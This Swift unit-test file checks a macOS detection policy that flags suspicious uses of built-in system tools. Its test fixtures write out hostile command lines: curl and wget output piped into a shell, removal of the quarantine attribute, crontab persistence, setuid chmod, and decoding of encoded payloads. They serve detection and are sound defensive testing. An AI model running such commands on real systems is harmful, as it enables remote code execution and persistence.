import XCTest
@testable import Nick

final class LOLBinExecutionPolicyTests: XCTestCase {
    func test_mktempTierRequiresValidatedSameChainWithoutDownloadOrQuarantine() {
        XCTAssertEqual(LOLBinExecutionPolicy.mktempTier(
            actorIdentityValidated: true,
            responsibleChainValidated: true,
            hasNetworkOrigin: false,
            hasQuarantineOrigin: false
        ), .observed)
        XCTAssertEqual(LOLBinExecutionPolicy.mktempTier(
            actorIdentityValidated: true,
            responsibleChainValidated: true,
            hasNetworkOrigin: true,
            hasQuarantineOrigin: false
        ), .protected)
        XCTAssertEqual(LOLBinExecutionPolicy.mktempTier(
            actorIdentityValidated: true,
            responsibleChainValidated: true,
            hasNetworkOrigin: false,
            hasQuarantineOrigin: true
        ), .protected)
        XCTAssertEqual(LOLBinExecutionPolicy.mktempTier(
            actorIdentityValidated: false,
            responsibleChainValidated: true,
            hasNetworkOrigin: false,
            hasQuarantineOrigin: false
        ), .protected)
    }


    func test_validatedRoutineDiscoveryStaysObservedWithoutRiskProvenance() throws {
        for invocation in [
            ("/usr/sbin/system_profiler", ["system_profiler", "SPSoftwareDataType"]),
            ("/bin/ps", ["ps", "-axo", "pid,ppid,command"]),
        ] {
            let finding = try XCTUnwrap(LOLBinExecutionPolicy.finding(
                executablePath: invocation.0, arguments: invocation.1
            ))
            XCTAssertEqual(LOLBinExecutionPolicy.effectiveTier(
                for: finding,
                actorIdentityValidated: true,
                responsibleChainValidated: true,
                hasNetworkOrigin: false,
                hasQuarantineOrigin: false
            ), .observed)
            XCTAssertEqual(LOLBinExecutionPolicy.effectiveTier(
                for: finding,
                actorIdentityValidated: true,
                responsibleChainValidated: true,
                hasNetworkOrigin: true,
                hasQuarantineOrigin: false
            ), .review)
        }
    }
    func test_appleCrashDiagnosticsKeepsOnlyValidatedUncorrelatedDiscoveryObserved() throws {
        let finding = try XCTUnwrap(LOLBinExecutionPolicy.finding(
            executablePath: "/usr/sbin/system_profiler",
            arguments: ["system_profiler", "-nospawn", "-xml", "SPThunderboltDataType", "-detailLevel", "full"]
        ))
        XCTAssertEqual(LOLBinExecutionPolicy.effectiveTier(
            for: finding, actorIdentityValidated: true, responsibleChainValidated: false,
            hasNetworkOrigin: false, hasQuarantineOrigin: false, isAppleCrashDiagnostics: true
        ), .observed)
        XCTAssertEqual(LOLBinExecutionPolicy.effectiveTier(
            for: finding, actorIdentityValidated: true, responsibleChainValidated: false,
            hasNetworkOrigin: false, hasQuarantineOrigin: false
        ), .review)
        XCTAssertEqual(LOLBinExecutionPolicy.effectiveTier(
            for: finding, actorIdentityValidated: true, responsibleChainValidated: false,
            hasNetworkOrigin: false, hasQuarantineOrigin: true, isAppleCrashDiagnostics: true
        ), .review)
    }

    func testUpdaterQuarantineRemovalRequiresAnExactSingleTargetWithinItsBundle() throws {
        let root = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        defer { try? FileManager.default.removeItem(at: root) }
        let contents = root.appendingPathComponent("GoogleUpdater.app/Contents")
        try FileManager.default.createDirectory(at: contents, withIntermediateDirectories: true)
        let payload = contents.appendingPathComponent("payload")
        let outside = root.appendingPathComponent("outside")
        try Data([0]).write(to: payload)
        try Data([0]).write(to: outside)
        let link = contents.appendingPathComponent("link")
        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: outside)
        let updater = contents.appendingPathComponent("GoogleUpdater").path
        let command = ["xattr", "-d", "com.apple.quarantine"]
        XCTAssertTrue(LOLBinExecutionPolicy.isScopedGoogleUpdaterQuarantineRemoval(
            arguments: command + [payload.path], updaterExecutable: updater
        ))
        for targets in [[outside.path], [link.path], [payload.path, outside.path]] {
            XCTAssertFalse(LOLBinExecutionPolicy.isScopedGoogleUpdaterQuarantineRemoval(
                arguments: command + targets, updaterExecutable: updater
            ))
        }
        let finding = try XCTUnwrap(LOLBinExecutionPolicy.finding(
            executablePath: "/usr/bin/xattr", arguments: command + [payload.path]
        ))
        XCTAssertEqual(LOLBinExecutionPolicy.effectiveTier(
            for: finding, actorIdentityValidated: true, responsibleChainValidated: true,
            hasNetworkOrigin: false, hasQuarantineOrigin: false, isScopedUpdaterMaintenance: true
        ), .observed)
        XCTAssertEqual(LOLBinExecutionPolicy.effectiveTier(
            for: finding, actorIdentityValidated: true, responsibleChainValidated: true,
            hasNetworkOrigin: false, hasQuarantineOrigin: false
        ), finding.tier)
    }

    func test_shortLivedCurlPipeIsClassifiedAtExec() throws {
        let finding = try XCTUnwrap(LOLBinExecutionPolicy.finding(
            executablePath: "/bin/sh",
            arguments: ["/bin/sh", "-c", "curl https://example.invalid/safe | /bin/sh"]
        ))
        XCTAssertEqual(finding.reason, "curl_pipe_shell")
        XCTAssertEqual(finding.severity, "critical")
        XCTAssertEqual(finding.title, "Download-to-shell command detected")
        XCTAssertEqual(finding.matchedCommand, "curl https://example.invalid/safe | /bin/sh")
    }

    func test_downloadToShellFormsRequireConcreteShellDestination() throws {
        let positives: [(String, [String])] = [
            ("/bin/zsh", ["zsh", "-c", "wget -qO- https://example.test/x | zsh"]),
            ("/bin/bash", ["bash", "-c", "$(curl -fsSL https://example.test/x)"]),
            ("/bin/zsh", ["zsh", "-lc", "curl -s https://example.test/x | sudo sh"]),
        ]
        for (path, arguments) in positives {
            XCTAssertNotNil(LOLBinExecutionPolicy.finding(executablePath: path, arguments: arguments))
        }
    }

    func test_codexLikeParentNonShellPipelinesAreNotDownloadToShellEvidence() {
        let actualSessionCommands = [
            #"rg -n "curl_pipe_shell|Move to Trash" Nick NickTests | head -240"#,
            #"rg -n "curl|wget" /Users/example/.zsh_history | tail -120"#,
            #"jq -r '.payload.input' session.jsonl | rg -i 'curl|wget'"#,
            #"shasum -a 256 fixture && rg -n 'curl' DOCS/5.0-progress.md"#,
        ]
        for command in actualSessionCommands {
            XCTAssertNil(LOLBinExecutionPolicy.finding(
                executablePath: "/bin/zsh",
                arguments: ["/bin/zsh", "-lc", command]
            ), command)
        }
    }

    func test_emptyArgumentsCannotProduceDownloadToShellFinding() {
        XCTAssertNil(LOLBinExecutionPolicy.finding(executablePath: "/bin/zsh", arguments: []))
    }

    func test_matchedCommandRedactsCommonSecrets() throws {
        let finding = try XCTUnwrap(LOLBinExecutionPolicy.finding(
            executablePath: "/bin/zsh",
            arguments: ["zsh", "-c", "curl https://user:password@example.test/x?token=secret | sh"]
        ))
        XCTAssertEqual(
            finding.matchedCommand,
            "curl https://<redacted>@example.test/x?token=<redacted> | sh"
        )
    }

    func test_safeCurlAndInteractiveShellAreNotClassified() {
        XCTAssertNil(LOLBinExecutionPolicy.finding(
            executablePath: "/usr/bin/curl",
            arguments: ["curl", "-I", "https://example.com"]
        ))
        XCTAssertNil(LOLBinExecutionPolicy.finding(
            executablePath: "/bin/zsh",
            arguments: ["zsh", "-l"]
        ))
    }

    func test_xpcQuarantinePolicyRefusesProtectedSystemShell() {
        XCTAssertTrue(LOLBinExecutionPolicy.isProtectedSystemPath("/bin/zsh"))
        XCTAssertTrue(LOLBinExecutionPolicy.isProtectedSystemPath("/usr/bin/curl"))
        XCTAssertFalse(LOLBinExecutionPolicy.isProtectedSystemPath("/usr/local/bin/tool"))
    }

    func test_readOnlyXattrIsNotClassifiedButQuarantineRemovalIs() {
        XCTAssertNil(LOLBinExecutionPolicy.finding(
            executablePath: "/usr/bin/xattr",
            arguments: ["xattr", "-p", "com.apple.quarantine", "/tmp/item"]
        ))
        XCTAssertEqual(
            LOLBinExecutionPolicy.finding(
                executablePath: "/usr/bin/xattr",
                arguments: ["xattr", "-d", "com.apple.quarantine", "/tmp/item"]
            )?.reason,
            "quarantine_removal"
        )
    }

    func test_crontabPersistenceRecognizesRealArgvForms() throws {
        for arguments in [["crontab", "-"], ["crontab", "-e"], ["crontab", "/tmp/jobs"]] {
            let finding = try XCTUnwrap(LOLBinExecutionPolicy.finding(
                executablePath: "/usr/bin/crontab",
                arguments: arguments
            ))
            XCTAssertEqual(finding.reason, "cron_modification")
            XCTAssertEqual(finding.title, "Added a cron job")
        }
    }

    func test_standaloneDecoderIsObservedEvidence() throws {
        for invocation in [
            ("/usr/bin/base64", ["base64", "-D", "/tmp/payload"]),
            ("/usr/bin/openssl", ["openssl", "enc", "-d", "-in", "/tmp/payload"]),
            ("/usr/bin/xxd", ["xxd", "-r", "/tmp/payload"]),
        ] {
            let finding = try XCTUnwrap(LOLBinExecutionPolicy.finding(
                executablePath: invocation.0,
                arguments: invocation.1
            ))
            XCTAssertEqual(finding.reason, "encoded_payload")
            XCTAssertEqual(finding.severity, "medium")
            XCTAssertEqual(finding.tier, .observed)
        }
    }

    func test_narrowScorecardBehaviorsUseStableReviewRules() throws {
        let fixtures: [(String, [String], String)] = [
            ("/usr/bin/env", ["env", "-i", "/bin/sh", "-c", ":"], "system_binary_proxy"),
            ("/bin/chmod", ["chmod", "4777", "/tmp/synthetic"], "permission_modification"),
            ("/usr/sbin/system_profiler", ["system_profiler", "SPSoftwareDataType"], "system_discovery"),
            ("/bin/ps", ["ps", "-axo", "pid,ppid,comm"], "process_discovery"),
        ]
        for (path, arguments, reason) in fixtures {
            let finding = try XCTUnwrap(LOLBinExecutionPolicy.finding(
                executablePath: path,
                arguments: arguments
            ))
            XCTAssertEqual(finding.reason, reason)
            XCTAssertEqual(finding.tier, .review)
        }
    }

    func test_routineUtilityUseDoesNotBecomeScorecardEvidence() {
        let routine: [(String, [String])] = [
            ("/usr/bin/env", ["env", "/usr/bin/true"]),
            ("/bin/chmod", ["chmod", "600", "/tmp/synthetic"]),
            ("/usr/bin/sw_vers", ["sw_vers"]),
            ("/bin/ps", ["ps", "-p", "1"]),
        ]
        for (path, arguments) in routine {
            XCTAssertNil(LOLBinExecutionPolicy.finding(
                executablePath: path,
                arguments: arguments
            ))
        }
    }

    func test_quarantinedUntrustedExecutionIsReviewEvidenceWithContextualSeverity() {
        XCTAssertEqual(ExecutionTrustPolicy.quarantinedExecutionSeverity(
            hasTrustedSigner: false,
            hasQuarantineOrigin: true,
            parentIsInterpreter: false,
            parentHasNetworkSocket: false
        ), "medium")
        XCTAssertEqual(ExecutionTrustPolicy.quarantinedExecutionSeverity(
            hasTrustedSigner: false,
            hasQuarantineOrigin: true,
            parentIsInterpreter: true,
            parentHasNetworkSocket: false
        ), "high")
        XCTAssertNil(ExecutionTrustPolicy.quarantinedExecutionSeverity(
            hasTrustedSigner: true,
            hasQuarantineOrigin: true,
            parentIsInterpreter: true,
            parentHasNetworkSocket: true
        ))
        XCTAssertNil(ExecutionTrustPolicy.quarantinedExecutionSeverity(
            hasTrustedSigner: false,
            hasQuarantineOrigin: false,
            parentIsInterpreter: true,
            parentHasNetworkSocket: true
        ))
    }
}
